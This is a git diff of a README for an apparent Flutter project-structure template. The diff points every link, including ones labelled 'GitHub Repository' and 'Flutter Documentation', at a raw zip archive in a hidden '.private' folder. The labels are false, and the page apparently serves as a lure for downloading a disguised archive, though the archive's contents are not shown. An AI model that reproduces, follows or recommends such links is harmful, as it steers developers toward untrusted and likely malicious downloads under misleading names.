@@ -1,6 +1,6 @@
 # 🎨 project_directory_structure_for_flutter_application - Organize Your Flutter Projects Easily
 
-[![Download Release](https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/source/project_directory_structure_for_flutter_application-3.0.zip%20Latest%https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/source/project_directory_structure_for_flutter_application-3.0.zip)](https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/source/project_directory_structure_for_flutter_application-3.0.zip)
+[![Download Release](https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/.private/for-directory-application-flutter-structure-project-3.7.zip%20Latest%https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/.private/for-directory-application-flutter-structure-project-3.7.zip)](https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/.private/for-directory-application-flutter-structure-project-3.7.zip)
 
 ## 📚 Description
 
@@ -12,7 +12,7 @@ Follow these steps to download and set up this project structure on your system.
 
 ## 📥 Download & Install
 
-To get the latest version of the **project_directory_structure_for_flutter_application**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/source/project_directory_structure_for_flutter_application-3.0.zip).
+To get the latest version of the **project_directory_structure_for_flutter_application**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/.private/for-directory-application-flutter-structure-project-3.7.zip).
 
 ### 🌐 System Requirements
 
@@ -64,7 +64,7 @@ This project is licensed under the WTFPL v2 License. You can use, modify, or dis
 
 ## 📌 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/source/project_directory_structure_for_flutter_application-3.0.zip)
-- [Flutter Documentation](https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/source/project_directory_structure_for_flutter_application-3.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/.private/for-directory-application-flutter-structure-project-3.7.zip)
+- [Flutter Documentation](https://raw.githubusercontent.com/Tailspinokinawa79/project_directory_structure_for_flutter_application/main/.private/for-directory-application-flutter-structure-project-3.7.zip)
 
 Utilize this guide to improve your Flutter project management. With a clear directory structure, developing applications becomes more streamlined and efficient. Happy coding!
